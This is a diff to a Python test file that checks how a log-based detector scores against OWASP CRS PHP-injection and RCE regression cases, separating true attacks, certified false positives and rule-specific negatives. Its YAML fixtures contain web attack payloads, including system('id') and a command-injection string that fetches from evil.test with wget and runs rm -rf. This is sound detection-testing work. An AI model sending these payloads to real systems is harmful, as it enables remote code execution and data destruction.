@@ -36,6 +36,9 @@ tests:
           method: GET
           headers:
             User-Agent: "OWASP CRS test agent"
+        output:
+          log:
+            expect_ids: [933150]
   - test_id: 2
     desc: payload in the query, and logarc does not catch it
     stages:
@@ -44,6 +47,9 @@ tests:
           method: GET
           headers:
             User-Agent: "OWASP CRS test agent"
+        output:
+          log:
+            expect_ids: [933150]
   - test_id: 3
     desc: payload in the body, which no access log records
     stages:
@@ -53,6 +59,9 @@ tests:
           data: "var=system('id')"
           headers:
             User-Agent: "OWASP CRS test agent"
+        output:
+          log:
+            expect_ids: [933150]
 """
 
 
@@ -87,8 +96,8 @@ def test_a_payload_in_the_body_is_not_counted_as_a_miss(corpus: Path, engine: Ru
     """
     (php,) = score_corpus(corpus, engine=engine, families=["933"])
 
-    assert php.cases - php.in_reach == 1
     assert php.out_of_reach == 1
+    assert php.cases == php.in_reach + php.negatives + php.out_of_reach + php.unscored
 
 
 def test_recall_is_over_what_could_be_seen_not_over_everything(
@@ -128,3 +137,117 @@ def test_an_unknown_family_is_refused_rather_than_scored_as_empty(
     worse than one that stops."""
     with pytest.raises(CorpusError, match="999"):
         score_corpus(corpus, engine=engine, families=["999"])
+
+
+#: `expect_ids` means a rule should fire; a `no_expect_ids` case described as a
+#: false positive is traffic CRS has certified as harmless. Both are scored, in
+#: opposite directions. (The third kind is below, and is scored in neither.)
+MIXED = """\
+---
+meta:
+  author: "test"
+rule_id: 933150
+tests:
+  - test_id: 1
+    desc: a real attack — something should fire
+    stages:
+      - input:
+          uri: "/get?x=system('id')"
+          method: GET
+        output:
+          log:
+            expect_ids: [933150]
+  - test_id: 2
+    desc: "False Positive: ordinary prose that merely mentions a function"
+    stages:
+      - input:
+          uri: "/get?test=PaintValdosta"
+          method: GET
+        output:
+          log:
+            no_expect_ids: [933150]
+"""
+
+
+@pytest.fixture
+def mixed(tmp_path: Path) -> Path:
+    root = tmp_path / "tests"
+    folder = root / "REQUEST-933-APPLICATION-ATTACK-PHP"
+    folder.mkdir(parents=True)
+    (folder / "933150.yaml").write_text(MIXED, encoding="utf-8")
+    return root
+
+
+def test_a_false_positive_case_is_not_counted_as_a_miss(mixed: Path, engine: RuleEngine) -> None:
+    """The corpus is not a list of attacks. A third of the PHP cases are
+    requests that must *not* match, and counting those in the denominator
+    reports the rules as worse than they are — which is the same dishonesty as
+    reporting them better, pointing the other way.
+    """
+    (php,) = score_corpus(mixed, engine=engine, families=["933"])
+
+    assert php.in_reach == 1, "only the attack counts towards recall"
+    assert php.caught == 1
+    assert php.recall == pytest.approx(1.0)
+
+
+def test_a_false_positive_case_is_measured_in_its_own_right(
+    mixed: Path, engine: RuleEngine
+) -> None:
+    """And it is the more valuable half. A rule pack can reach any recall by
+    matching everything; what stops it is being counted when it fires on
+    traffic somebody else has certified as harmless."""
+    (php,) = score_corpus(mixed, engine=engine, families=["933"])
+
+    assert php.negatives == 1
+    assert php.false_alarms == 0, "PaintValdosta is prose, and nothing should fire on it"
+
+
+#: The trap. `no_expect_ids` names CRS rule IDs, and the traffic under it is
+#: whatever it happens to be — here, a live RCE that a neighbouring CRS rule is
+#: expected to catch instead. Taken from 932230.yaml, shortened.
+RULE_SPECIFIC = """\
+---
+meta:
+  author: "test"
+rule_id: 932230
+tests:
+  - test_id: 1
+    desc: System Command Injection (932230) from old modsec regressions
+    stages:
+      - input:
+          uri: "/get?foo=system('echo%20cd%20/tmp;wget%20http://evil.test/x.png;rm%20-rf')"
+          method: GET
+        output:
+          log:
+            no_expect_ids: [932230]
+"""
+
+
+@pytest.fixture
+def rule_specific(tmp_path: Path) -> Path:
+    root = tmp_path / "tests"
+    folder = root / "REQUEST-932-APPLICATION-ATTACK-RCE"
+    folder.mkdir(parents=True)
+    (folder / "932230.yaml").write_text(RULE_SPECIFIC, encoding="utf-8")
+    return root
+
+
+def test_a_rule_specific_negative_is_not_treated_as_harmless_traffic(
+    rule_specific: Path, engine: RuleEngine
+) -> None:
+    """`no_expect_ids` constrains one CRS rule by number; it does not certify
+    the request. This one is `system('echo cd /tmp;wget …;rm -rf')` — an
+    attack, marked so that *this* CRS rule stays out of the way of another one.
+
+    logarc has no mapping onto CRS rule IDs, so it can be neither right nor
+    wrong here. Counting the match as a false alarm would be the same error as
+    counting it as a miss, pointed the other way — and this time it would
+    understate the rules rather than overstate them.
+    """
+    (rce,) = score_corpus(rule_specific, engine=engine, families=["932"])
+
+    assert rce.unscored == 1
+    assert rce.negatives == 0, "nothing certified this request as harmless"
+    assert rce.false_alarms == 0
+    assert rce.in_reach == 0, "and the corpus never asked for a match either"
